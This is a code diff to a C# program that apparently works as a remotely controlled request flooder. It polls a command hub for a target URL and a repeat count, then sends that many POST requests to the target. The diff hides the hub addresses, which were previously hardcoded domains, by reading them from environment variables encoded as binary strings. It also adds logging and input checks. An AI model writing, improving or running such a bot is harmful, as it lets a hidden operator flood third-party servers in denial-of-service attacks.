@@ -4,13 +4,14 @@ namespace stms;
 
 public class MainClass
 {
-    public const string hub_url = "https://wardex.space/stms/req.json";
-    public const string hub_url_backup = "https://mod.wtf/stms/req.json";
+    public static readonly string hub_url = DecodeLink(Environment.GetEnvironmentVariable("HUB_URL"));
+    public static readonly string hub_url_backup = DecodeLink(Environment.GetEnvironmentVariable("HUB_URL_BACKUP"));
 
     private static readonly HttpClient _httpClient = new HttpClient();
 
     public static void Main()
     {
+        Logger.Log("Started!");
         MainAsync().GetAwaiter().GetResult();
     }
 
@@ -20,14 +21,16 @@ public class MainClass
         {
             await Handle(hub_url);
         }
-        catch (Exception)
+        catch (Exception a)
         {
+            Logger.Log(a.ToString());
             try
             {
                 await Handle(hub_url_backup);
             }
-            catch
+            catch (Exception b)
             {
+                Logger.Log(b.ToString());
                 Environment.Exit(0);
             }
         }
@@ -37,26 +40,43 @@ public class MainClass
 
     public static async Task Handle(string target_url)
     {
-        HttpResponseMessage response = await _httpClient.GetAsync(target_url);
-        response.EnsureSuccessStatusCode();
-        string jsonResponse = await response.Content.ReadAsStringAsync();
-
-        string url = ExtractJsonString(jsonResponse, "url");
-        int count = ExtractJsonInt(jsonResponse, "count");
-
-        if (string.IsNullOrEmpty(url))
-            throw new Exception("Empty URL");
-
-        for (var i = 0; i < count; i++)
+        try
         {
-            await SendRequest(url);
+            HttpResponseMessage response = await _httpClient.GetAsync(target_url);
+            response.EnsureSuccessStatusCode();
+            string jsonResponse = await response.Content.ReadAsStringAsync();
+
+            string url = ExtractJsonString(jsonResponse, "url");
+            int count = ExtractJsonInt(jsonResponse, "count");
+
+            if (string.IsNullOrEmpty(url))
+                throw new Exception("Empty URL");
+
+            if (int.IsNegative(count))
+                throw new Exception("Negative count");
+
+            for (var i = 0; i < count; i++)
+            {
+                await SendRequest(url);
+            }
+        }
+        catch
+        {
+            throw;
         }
     }
 
     public static async Task SendRequest(string target_url)
     {
-        var content = new StringContent("{ \"hello\": \"hello world\" }", Encoding.UTF8, "application/json");
-        await _httpClient.PostAsync(target_url, content);
+        try
+        {
+            var content = new StringContent("{ \"hello\": \"hello world\" }", Encoding.UTF8, "application/json");
+            await _httpClient.PostAsync(target_url, content);
+        }
+        catch
+        {
+            throw;
+        }
     }
 
     private static string? ExtractJsonString(string json, string key)
@@ -117,5 +137,32 @@ public class MainClass
             // ignored
         }
         return 0;
+    }
+
+    private static string DecodeLink(string link)
+    {
+        if (string.IsNullOrEmpty(link))
+            return null;
+        
+        try
+        {
+            link = link.Replace(" ", "");
+
+            if (link.Length % 8 != 0)
+                return null;
+
+            byte[] data = new byte[link.Length / 8];
+            for (int i = 0; i < data.Length; i++)
+            {
+                string dataSegment = link.Substring(i * 8, 8);
+                data[i] = Convert.ToByte(dataSegment, 2);
+            }
+
+            return Encoding.UTF8.GetString(data);
+        }
+        catch
+        {
+            return null;
+        }
     }
 }
